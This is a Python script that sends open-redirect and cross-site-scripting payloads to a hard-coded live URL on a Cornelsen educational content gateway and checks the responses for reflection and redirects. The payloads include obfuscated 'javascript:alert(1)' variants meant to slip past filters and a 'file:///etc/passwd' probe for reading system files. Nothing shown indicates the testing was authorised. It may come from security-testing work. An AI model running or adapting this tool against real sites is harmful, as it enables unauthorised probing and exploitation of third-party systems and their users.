#!/usr/bin/env python3
"""
Bypass Verification Tool
Verifies if detected bypasses are real by checking payload reflection and redirects
"""

import requests
import urllib.parse
import time
from colorama import init, Fore, Style

# Initialize colorama
init()

class BypassVerifier:
    def __init__(self, target_url, delay=0.1):
        self.target_url = target_url
        self.delay = delay
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.real_bypasses = []
        
    def verify_bypass(self, param_name, payload):
        """Verify if a bypass is real by checking payload reflection and redirects"""
        try:
            # Test the payload
            test_url = f"{self.target_url}&{param_name}={urllib.parse.quote(payload)}"
            response = self.session.get(test_url, timeout=10, allow_redirects=False)
            
            # Check for real bypass indicators
            is_real_bypass = False
            bypass_type = ""
            
            # Check for redirects to malicious URLs
            if response.status_code in [301, 302, 307, 308]:
                location = response.headers.get('Location', '').lower()
                if location and ('javascript:' in location or 'alert(' in location):
                    is_real_bypass = True
                    bypass_type = "REDIRECT_TO_JAVASCRIPT"
                elif location and not any(domain in location for domain in ['cornelsen.de', 'cornelsen.ai']):
                    is_real_bypass = True
                    bypass_type = "OPEN_REDIRECT"
            
            # Check for payload reflection in response
            elif response.status_code == 200:
                response_text = response.text.lower()
                payload_lower = payload.lower()
                
                # Check if payload is actually reflected
                if payload_lower in response_text:
                    # Check if it's in a dangerous context
                    if 'javascript:' in response_text or '<script' in response_text:
                        is_real_bypass = True
                        bypass_type = "PAYLOAD_REFLECTION"
                    elif 'href=' in response_text or 'src=' in response_text:
                        is_real_bypass = True
                        bypass_type = "ATTRIBUTE_INJECTION"
                
                # Check for other dangerous indicators
                elif 'javascript:' in response_text:
                    is_real_bypass = True
                    bypass_type = "JAVASCRIPT_IN_RESPONSE"
                elif 'alert(' in response_text:
                    is_real_bypass = True
                    bypass_type = "ALERT_IN_RESPONSE"
                elif '<script' in response_text:
                    is_real_bypass = True
                    bypass_type = "SCRIPT_TAG_IN_RESPONSE"
            
            # Check for error responses that might indicate bypass
            elif response.status_code in [400, 500]:
                # Check if error message contains the payload
                response_text = response.text.lower()
                payload_lower = payload.lower()
                if payload_lower in response_text:
                    is_real_bypass = True
                    bypass_type = "ERROR_REFLECTION"
            
            if is_real_bypass:
                self.real_bypasses.append({
                    'param': param_name,
                    'payload': payload,
                    'url': test_url,
                    'status': response.status_code,
                    'length': len(response.content),
                    'type': bypass_type,
                    'location': response.headers.get('Location', ''),
                    'response_sample': response.text[:200] + "..." if len(response.text) > 200 else response.text
                })
                return True
            
            return False
            
        except Exception as e:
            print(f"{Fore.RED}[-] Error verifying {param_name}={payload}: {e}{Style.RESET_ALL}")
            return False
    
    def verify_list(self, bypass_list):
        """Verify a list of potential bypasses"""
        print(f"{Fore.CYAN}[*] Verifying {len(bypass_list)} potential bypasses...{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        
        verified_count = 0
        for i, bypass in enumerate(bypass_list, 1):
            print(f"{Fore.BLUE}[{i}/{len(bypass_list)}] Verifying {bypass['param']}={bypass['payload']}{Style.RESET_ALL}")
            
            if self.verify_bypass(bypass['param'], bypass['payload']):
                verified_count += 1
                print(f"{Fore.GREEN}[+] REAL BYPASS CONFIRMED!{Style.RESET_ALL}")
                print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[-] False positive{Style.RESET_ALL}")
            
            time.sleep(self.delay)
        
        self.print_summary()
    
    def print_summary(self):
        """Print verification summary"""
        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] BYPASS VERIFICATION COMPLETED{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        
        if self.real_bypasses:
            print(f"{Fore.GREEN}[+] Found {len(self.real_bypasses)} REAL bypasses:{Style.RESET_ALL}")
            for i, bypass in enumerate(self.real_bypasses, 1):
                print(f"\n{Fore.GREEN}[{i}] Real Bypass Details:{Style.RESET_ALL}")
                print(f"  Parameter: {bypass['param']}")
                print(f"  Payload: {bypass['payload']}")
                print(f"  Type: {bypass['type']}")
                print(f"  Status: {bypass['status']}")
                print(f"  Length: {bypass['length']}")
                if bypass['location']:
                    print(f"  Redirect: {bypass['location']}")
                print(f"  Response Sample: {bypass['response_sample']}")
        else:
            print(f"{Fore.YELLOW}[!] No real bypasses found. All detected bypasses were false positives.{Style.RESET_ALL}")

def main():
    # Test a few of the detected bypasses to see if they're real
    target_url = "https://gateway.lti.cornelsen.de/v2/LearningObjects/SO/d6097add-1969-4727-9b24-5336ffeda16d/assets/learningObjects/index.e65285af-3c67-4341-b4a6-c58144a339c1.html?RedirectUrl="
    
    # Sample of detected bypasses to verify
    sample_bypasses = [
        {'param': 'target', 'payload': 'file:///etc/passwd'},
        {'param': 'target', 'payload': 'jav\\u0061script:alert(1)'},
        {'param': 'target', 'payload': 'javascript`alert(1)'},
        {'param': 'dest', 'payload': 'javascript\nalert(1)'},
        {'param': 'dest', 'payload': 'javascript​:alert(1)'},
        {'param': 'dest', 'payload': 'javascript‌:alert(1)'},
        {'param': 'callback', 'payload': 'javascript:alert(1)'},
        {'param': 'jsonp', 'payload': 'javascript:alert(1)'},
    ]
    
    verifier = BypassVerifier(target_url)
    verifier.verify_list(sample_bypasses)

if __name__ == "__main__":
    main() 